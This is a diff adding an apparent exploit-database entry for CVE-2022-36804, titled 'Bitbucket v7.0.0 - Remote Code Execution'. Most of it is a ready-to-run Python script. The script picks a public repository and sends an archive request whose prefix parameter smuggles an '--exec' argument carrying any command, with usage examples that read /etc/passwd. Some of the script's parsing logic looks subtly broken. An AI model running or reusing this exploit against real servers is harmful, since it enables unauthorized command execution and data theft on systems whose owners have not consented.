@@ -1,0 +1,73 @@
+id: 38290
+date: 03/23/2023
+title: Bitbucket v7.0.0 - Remote Code Execution Exploit
+author: khal4n1
+cves: CVE-2022-36804
+
+# Exploit Title: Bitbucket v7.0.0 -  RCE
+# Exploit Author: khal4n1
+# Vendor Homepage: https://github.com/khal4n1
+# Tested on: Kali and ubuntu LTS 22.04
+# CVE : cve-2022-36804
+
+#****************************************************************#
+#The following exploit is used to exploit a vulnerability present
+#Atlassian Bitbucket Server and Data Center 7.0.0 before version
+#7.6.17, from version 7.7.0 before version 7.17.10, from version
+#7.18.0 before version 7.21.4, from version 8.0.0 before version
+#8.0.3, from version 8.1.0 before version 8.1.3, and from version
+#8.2.0 before version 8.2.2, and from version 8.3.0 before 8.3.1
+
+#Usage Example
+
+# python3 mexploit.py --url http://127.0.0.1:7990 --cmd 'cat /etc/passwd'
+
+# python3 mexploit.py --url http://127.0.0.1:7990 --cmd 'id'
+
+#The server will send a 500 http response with the stout output from the
+# command  executed.
+
+
+#****************************************************************#
+
+#!/usr/bin/python3
+
+import argparse
+import urllib
+from urllib import request
+import re
+
+#argument setup
+parser = argparse.ArgumentParser(description='Program to test
+bitbucket vulnerability CVE-2022-36804')
+parser.add_argument("--url", help="Set the target to attack.
+[REQUIRED]", required=True )
+parser.add_argument("--cmd", help="Set the command to execute.
+[DEFAULT ID]", required=True, default='id')
+args = parser.parse_args()
+cmd= urllib.parse.quote(args.cmd)
+
+
+#reads from the public repository what is available
+requ = request.urlopen(args.url+ "/repos?visibility=public")
+response = requ.read()
+
+#select a public project and stores it in a variable
+project = re.findall('7990/projects/(.*)/repos/',
+str(re.findall('7990/projects/(.*)/repos/', str(response))[-1]))[-1]
+
+#Selects a public repo and stores it in a vatiable
+file = re.findall('/repos/(.*)/browse',
+str(re.findall('7990/projects/(.*)/repos/', str(response))[-1]))[0]
+
+# Exploitation
+try :
+        attack = request.urlopen(args.url +
+"/rest/api/latest/projects/" + project + "/repos/" + file +
+"/archive?prefix=ax%00--exec=%60"+cmd+"%60%00--remote=origin")
+        print (attack.response())
+except urllib.error.HTTPError as e:
+        body = e.read().decode()  # Read the body of the error response
+        print (body)
+
+#  0day.today [2023-04-03]  #
